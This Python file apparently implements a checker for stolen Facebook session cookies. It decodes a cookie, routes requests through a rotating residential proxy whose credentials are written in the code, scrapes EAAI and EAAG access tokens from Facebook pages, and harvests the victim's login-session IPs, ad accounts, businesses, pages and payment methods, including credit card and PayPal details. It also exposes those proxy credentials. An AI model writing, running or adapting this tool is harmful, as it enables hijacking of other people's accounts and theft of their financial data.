
import traceback
from urllib.parse import unquote
import base64
import json
import random
import re
import requests


class Facebook:
    def __init__(self):
        self.DEFAULT_USERAGENT_DESKTOP = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15'
        self.DEFAULT_USERAGENT_MOBILE = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)'
        self.FACEBOOK_BASE_CORE = 'https://graph.facebook.com'
        self.FACEBOOK_BASE_API = 'https://graph.facebook.com/v13.0'
        self.FACEBOOK_BASE_MBASIC = 'https://mbasic.facebook.com'
        self.FACEBOOK_BASE_M = 'https://m.facebook.com'
        self.FACEBOOK_BASE_WWW = 'https://www.facebook.com'
        self.FACEBOOK_BASE_BM = 'https://business.facebook.com'

    def apiCheck(self, cookieEncode):
        try:
            cookie = self.apiDecodeBase64(cookieEncode)

            api = requests.Session()
            api = self.apiSetProxyToSession(api)
            api = self.apiSetCookieToSession(api, cookie)

            fbUID = self.apiGetUidFromCookie(cookie)
            if fbUID is None:
                return None

            EAAI = self.apiGetTokenEAAI(api)
            if EAAI is None:
                return None

            EAAG = self.apiGetTokenEAAG(api)
            if EAAG is None:
                return None

            sessions = self.apiGetSessions(api)
            me = self.apiGetMe(api, EAAG)
            adaccounts = self.apiGetAdaccountsMapping(api, EAAI, fbUID)
            businesses = self.apiGetBusinesses(api, EAAG)
            pages = self.apiGetFacebookPages(api, EAAG)

            return {
                'EAAI': EAAI,
                'EAAG': EAAG,
                'sessions': sessions,
                'me': me,
                'adaccounts': adaccounts,
                'businesses': businesses,
                'pages': pages
            }
        except requests.exceptions.ConnectionError:
            return self.apiCheck(cookieEncode)
        except:
            print(traceback.format_exc())
            return None

    def apiDecodeBase64(self, encode):
        return base64.b64decode(encode.encode('utf-8')).decode('utf-8')

    def apiChunks(self, lst, n):
        return [lst[i:i + n] for i in range(0, len(lst), n)]

    def apiParserCookieToDic(self, cookie):
        return {c['name']: c['value'] for c in json.loads(cookie)}

    def apiGetUidFromCookie(self, cookie):
        return self.apiParserCookieToDic(cookie).get('c_user')

    def apiSetCookieToSession(self, api: requests.Session, cookie):
        api.cookies.update(self.apiParserCookieToDic(cookie))
        return api

    def apiGetHeadersDesktop(self):
        return {'User-Agent': self.DEFAULT_USERAGENT_DESKTOP}

    def apiGetHeadersMobile(self):
        return {'User-Agent': self.DEFAULT_USERAGENT_MOBILE}

    def apiSetProxyToSession(self, api: requests.Session):
        session_id = random.random()
        api.proxies.update({
            'http': f'http://lum-customer-hl_ab3d1e44-zone-checker-session-{session_id}:4sinqp2g8704@zproxy.lum-superproxy.io:22225',
            'https': f'http://lum-customer-hl_ab3d1e44-zone-checker-session-{session_id}:4sinqp2g8704@zproxy.lum-superproxy.io:22225'
        })
        return api

    def apiGetTokenEAAI(self, api: requests.Session):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_WWW}/ads/manager/account_settings/account_billing',
                headers=self.apiGetHeadersDesktop()
            ).text
            regx = re.findall(r'access_token:"(.*?)"', res)
            return regx[0] if len(regx) > 0 else None
        except:
            return None

    def apiGetTokenEAAB(self, api: requests.Session, act):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_WWW}/adsmanager/manage/campaigns?act={act}',
                headers=self.apiGetHeadersDesktop()
            ).text
            regx = re.findall(r'__accessToken="(.*?)', res)
            return regx[0] if len(regx) > 0 else None
        except:
            return None

    def apiGetTokenEAAG(self, api: requests.Session):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_BM}/content_management',
                headers=self.apiGetHeadersDesktop()
            ).text
            regx = re.findall(r'accessToken":"(EAAG.*?)"', res)
            return regx[0] if len(regx) > 0 else None
        except:
            return None

    def apiGetSessions(self, api: requests.Session):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_M}/settings/security_login/sessions',
                headers=self.apiGetHeadersMobile()
            ).text
            IP = re.findall(r'__html:"IP: (.*?)"', res)
            return list(dict.fromkeys(IP))
        except:
            return []

    def apiGetMe(self, api: requests.Session, access_token):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_API}/me?fields=id,name,birthday,gender,friends.limit(0),picture.type(large)&access_token={access_token}',
                headers=self.apiGetHeadersDesktop()
            ).json()
            return res
        except:
            return {}

    def apiGetAdaccounts(self, api: requests.Session, access_token, adaccounts=[], next=None):
        try:
            if next is None:
                default_url = f'{self.FACEBOOK_BASE_API}/me?fields=adaccounts.limit(2500){{account_id,id,name,account_status,currency,balance,amount_spent,adtrust_dsl,adspaymentcycle,owner,users,business,timezone_name,timezone_offset_hours_utc,is_notifications_enabled,disable_reason,ads_volume}}&access_token={access_token}'
                res = api.get(
                    default_url,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'adaccounts' in res:
                    if len(res['adaccounts']['data']) >= 2500:
                        if 'next' in res['adaccounts']['paging']:
                            return self.apiGetAdaccounts(
                                api,
                                access_token,
                                adaccounts + res['adaccounts']['data'],
                                res['adaccounts']['paging']['next']
                            )
                    return res['adaccounts']['data']
                return adaccounts
            else:
                next = unquote(next)
                res = api.get(
                    next,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'next' in res['paging']:
                    return self.apiGetAdaccounts(
                        api,
                        access_token,
                        adaccounts + res['data'],
                        res['paging']['next']
                    )
                return adaccounts + res['data']
        except:
            return adaccounts

    def apiGetAdaccountsMapping(self, api: requests.Session, access_token, uid):
        adaccounts_fixed = []

        adaccounts = self.apiGetAdaccounts(api, access_token)
        try:
            adaccounts_has_permission = []
            for adaccount in adaccounts:
                me = None
                for e in adaccount['users']['data']:
                    if e['id'] == uid:
                        me = e
                        break
                if me['role'] in [1001, 1002]:
                    adaccounts_has_permission.append(adaccount)

            adaccounts_has_permission_chunks = self.apiChunks(
                adaccounts_has_permission,
                100
            )
            adaccounts_values = {}
            for adaccounts_chunks in adaccounts_has_permission_chunks:
                ids = ','.join(
                    list(map(lambda e: e['id'], adaccounts_chunks)))
                res = api.get(
                    f'{self.FACEBOOK_BASE_API}?ids={ids}&fields=all_payment_methods{{pm_credit_card{{credit_card_address,credit_card_type,display_string,exp_month,exp_year,is_verified,time_created}},payment_method_paypal{{email_address,time_created}},payment_method_stored_balances{{balance,total_fundings,time_created}}}}&access_token={access_token}',
                    headers=self.apiGetHeadersDesktop()
                ).json()
                adaccounts_values = {**adaccounts_values, **res}

            for adaccount in adaccounts:
                adaccounts_fixed.append(
                    {**adaccount, **adaccounts_values[adaccount['id']]}
                )
            return adaccounts_fixed
        except:
            return adaccounts

    def apiGetBusinesses(self, api: requests.Session, access_token, businesses=[], next=None):
        try:
            if next is None:
                default_url = f'{self.FACEBOOK_BASE_API}/me?fields=businesses.limit(2500){{id,name,owned_ad_accounts.limit(2500){{id,account_id,name}},business_users.limit(2500){{id,name,role,email,pending_email}},created_time,owned_pixels{{id,name}}}}&access_token={access_token}'
                res = api.get(
                    default_url,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'businesses' in res:
                    if len(res['businesses']['data']) >= 2500:
                        if 'next' in res['businesses']['paging']:
                            return self.apiGetBusinesses(
                                api,
                                access_token,
                                businesses + res['businesses']['data'],
                                res['businesses']['paging']['next']
                            )
                    return res['businesses']['data']
                return businesses
            else:
                next = unquote(next)
                res = api.get(
                    next,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'next' in res['paging']:
                    return self.apiGetBusinesses(
                        api,
                        access_token,
                        businesses + res['data'],
                        res['paging']['next']
                    )
                return businesses + res['data']
        except:
            return businesses

    def apiGetFacebookPages(self, api: requests.Session, access_token, facebook_pages=[], next=None):
        try:
            if next is None:
                default_url = f'{self.FACEBOOK_BASE_API}/me?fields=facebook_pages.limit(2500){{id,name,page_created_time,followers_count,fan_count,owner_business,roles}}&access_token={access_token}'
                res = api.get(
                    default_url,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'facebook_pages' in res:
                    if len(res['facebook_pages']['data']) >= 2500:
                        if 'next' in res['facebook_pages']['paging']:
                            return self.apiGetFacebookPages(
                                api,
                                access_token,
                                facebook_pages + res['facebook_pages']['data'],
                                res['facebook_pages']['paging']['next']
                            )
                    return res['facebook_pages']['data']
                return facebook_pages
            else:
                next = unquote(next)
                res = api.get(
                    next,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'next' in res['paging']:
                    return self.apiGetFacebookPages(
                        api,
                        access_token,
                        facebook_pages + res['data'],
                        res['paging']['next']
                    )
                return facebook_pages + res['data']
        except:
            return facebook_pages


facebook = Facebook()
